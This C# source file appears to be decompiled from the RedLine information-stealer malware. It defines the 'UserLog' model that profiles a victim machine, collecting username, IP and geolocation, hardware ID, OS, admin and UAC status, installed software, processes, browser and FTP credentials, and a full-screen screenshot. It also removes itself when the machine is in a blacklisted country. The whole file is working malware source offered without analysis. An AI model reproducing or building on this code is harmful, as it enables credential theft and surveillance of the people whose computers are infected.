using RedLine.Client.Logic.Others;
using RedLine.Logic.Helpers;
using RedLine.Logic.Others;
using RedLine.Models.Browsers;
using RedLine.Models.UAC;
using RedLine.Models.WMI;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.Serialization;
using System.Windows.Forms;

namespace RedLine.Models
{
  [DataContract(Name = "UserLog", Namespace = "v1/Models")]
  public class UserLog
  {
    public UserLog()
    {
      this.Credentials = new Credentials();
      this.Credentials.Browsers = (IList<Browser>) new List<Browser>();
      this.Credentials.Files = (IList<RemoteFile>) new List<RemoteFile>();
      this.Credentials.FtpConnections = (IList<LoginPair>) new List<LoginPair>();
      this.Credentials.Hardwares = (IList<Hardware>) new List<Hardware>();
      this.Credentials.InstalledBrowsers = (IList<InstalledBrowserInfo>) new List<InstalledBrowserInfo>();
      this.Credentials.InstalledSoftwares = (IList<string>) new List<string>();
      this.Credentials.Languages = (IList<string>) new List<string>();
      this.Credentials.Processes = (IList<string>) new List<string>();
    }

    [DataMember(Name = "HWID")]
    public string HWID { get; set; }

    [DataMember(Name = "BuildID")]
    public string BuildID { get; set; }

    [DataMember(Name = "Username")]
    public string Username { get; set; }

    [DataMember(Name = "IsProcessElevated")]
    public bool IsProcessElevated { get; set; }

    [DataMember(Name = "OS")]
    public string OS { get; set; }

    [DataMember(Name = "CurrentLanguage")]
    public string CurrentLanguage { get; set; }

    [DataMember(Name = "MonitorSize")]
    public string MonitorSize { get; set; }

    [DataMember(Name = "LogDate")]
    public DateTime LogDate { get; set; }

    [DataMember(Name = "AdminPromptType")]
    public AdminPromptType UacType { get; set; }

    [DataMember(Name = "Credentials")]
    public Credentials Credentials { get; set; }

    [DataMember(Name = "Country")]
    public string Country { get; set; }

    [DataMember(Name = "Location")]
    public string Location { get; set; }

    [DataMember(Name = "TimeZone")]
    public string TimeZone { get; set; }

    [DataMember(Name = "IP")]
    public string IP { get; set; }

    [DataMember(Name = "Screenshot")]
    public byte[] Screenshot { get; set; }

    [DataMember(Name = "UserAgent")]
    public string UserAgent { get; set; }

    public static UserLog Create(ClientSettings settings)
    {
      UserLog userLog = new UserLog();
      try
      {
        GeoInfo geoInfo = GeoHelper.Get();
        IList<string> blacklistedCountry1 = settings.BlacklistedCountry;
        if ((blacklistedCountry1 != null ? (blacklistedCountry1.Count > 0 ? 1 : 0) : 0) != 0 && settings.BlacklistedCountry.Contains(geoInfo.Country))
          InstallManager.RemoveCurrent();
        WmiDiskDrive wmiDiskDrive = new WmiService().QueryFirst<WmiDiskDrive>((WmiQueryBase) new WmiDiskDriveQuery());
        Size size = Screen.PrimaryScreen.Bounds.Size;
        string str = System.TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
        if (!str.StartsWith("-"))
          str = "+" + str;
        userLog.IP = geoInfo.IP;
        userLog.Location = geoInfo.Location;
        userLog.Country = geoInfo.Country;
        userLog.Screenshot = UserLog.CaptureScreen();
        userLog.UserAgent = UserAgentDetector.GetUserAgent();
        IList<string> blacklistedCountry2 = settings.BlacklistedCountry;
        if ((blacklistedCountry2 != null ? (blacklistedCountry2.Count > 0 ? 1 : 0) : 0) != 0 && settings.BlacklistedCountry.Contains(geoInfo.Country))
          InstallManager.RemoveCurrent();
        userLog.HWID = DecryptHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + wmiDiskDrive.SerialNumber).Replace("-", string.Empty);
        userLog.CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
        userLog.TimeZone = "UTC" + str;
        userLog.MonitorSize = string.Format("{0}x{1}", (object) size.Width, (object) size.Height);
        userLog.IsProcessElevated = NativeMethods.IsUserAnAdmin();
        userLog.UacType = UacHelper.AdminPromptBehavior;
        userLog.OS = OsDetector.GetWindowsVersion();
        userLog.Username = Environment.UserName;
      }
      catch
      {
      }
      finally
      {
        userLog.HWID = string.IsNullOrWhiteSpace(userLog.HWID) ? "UNKNOWN" : userLog.HWID;
        userLog.IP = string.IsNullOrWhiteSpace(userLog.IP) ? "UNKNOWN" : userLog.IP;
        userLog.MonitorSize = string.IsNullOrWhiteSpace(userLog.MonitorSize) ? "UNKNOWN" : userLog.MonitorSize;
        userLog.OS = string.IsNullOrWhiteSpace(userLog.OS) ? "UNKNOWN" : userLog.OS;
        userLog.TimeZone = string.IsNullOrWhiteSpace(userLog.TimeZone) ? "UNKNOWN" : userLog.TimeZone;
        userLog.Username = string.IsNullOrWhiteSpace(userLog.Username) ? "UNKNOWN" : userLog.Username;
        userLog.Location = string.IsNullOrWhiteSpace(userLog.Location) ? "UNKNOWN" : userLog.Location;
        userLog.Country = string.IsNullOrWhiteSpace(userLog.Country) ? "UNKNOWN" : userLog.Country;
        userLog.CurrentLanguage = string.IsNullOrWhiteSpace(userLog.CurrentLanguage) ? "UNKNOWN" : userLog.CurrentLanguage;
        userLog.UserAgent = string.IsNullOrWhiteSpace(userLog.UserAgent) ? "UNKNOWN" : userLog.UserAgent;
      }
      return userLog;
    }

    public static byte[] CaptureScreen()
    {
      return UserLog.ImageToByte((Image) UserLog.GetScreenshot());
    }

    private static Bitmap GetScreenshot()
    {
      try
      {
        Size size = Screen.PrimaryScreen.Bounds.Size;
        Bitmap bitmap = new Bitmap(size.Width, size.Height);
        using (Graphics graphics = Graphics.FromImage((Image) bitmap))
        {
          graphics.InterpolationMode = InterpolationMode.Bicubic;
          graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
          graphics.SmoothingMode = SmoothingMode.HighSpeed;
          graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
        }
        return bitmap;
      }
      catch
      {
        return (Bitmap) null;
      }
    }

    private static byte[] ImageToByte(Image img)
    {
      try
      {
        if (img == null)
          return (byte[]) null;
        using (MemoryStream memoryStream = new MemoryStream())
        {
          img.Save((Stream) memoryStream, ImageFormat.Png);
          return memoryStream.ToArray();
        }
      }
      catch
      {
        return (byte[]) null;
      }
    }
  }
}
